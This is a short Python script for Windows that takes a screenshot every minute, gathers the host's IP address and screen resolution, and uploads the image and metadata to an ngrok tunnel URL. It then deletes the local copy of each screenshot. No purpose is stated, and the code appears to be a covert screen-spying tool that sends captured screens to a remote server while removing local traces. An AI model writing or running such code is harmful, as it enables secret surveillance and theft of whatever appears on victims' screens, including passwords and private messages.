import pyautogui as auto
import requests as req
import time
from datetime import datetime as dt
import socket
import win32api 
import os
import json

url = 'https://2cd806763b3e.ngrok.io/'
data_url = 'https://2cd806763b3e.ngrok.io/data'
ip = socket.gethostbyname(socket.gethostname())
w_resolution = win32api.GetSystemMetrics(0)
h_resolution = win32api.GetSystemMetrics(1)
resolution = '{}x{}'.format(w_resolution,h_resolution)

while True:
    now = dt.now()
    if(now.strftime('%S')=='00'):
        file_name = now.strftime('%Y-%m-%dT%H_%M_%S')
        time.sleep(1)
        auto.screenshot(file_name+'.png')
        time.sleep(1)
        files = {'screen':open(file_name+'.png','rb')}
        data = {
            'ip':str(ip),
            'resolution':resolution,
            'date' : now.strftime('%d/%m/%Y'),
            'time': now.strftime('%H:%M:%S')
        }
        json_data = json.dumps(data)
        print(json_data)
        time.sleep(1)
        req.post(data_url,json=json_data)
        req.post(url,files=files)
        files['screen'].close()
        time.sleep(5)
        if os.path.exists(file_name+'.png'):
            os.remove(file_name+'.png')
        else:
            print("The file does not exist")
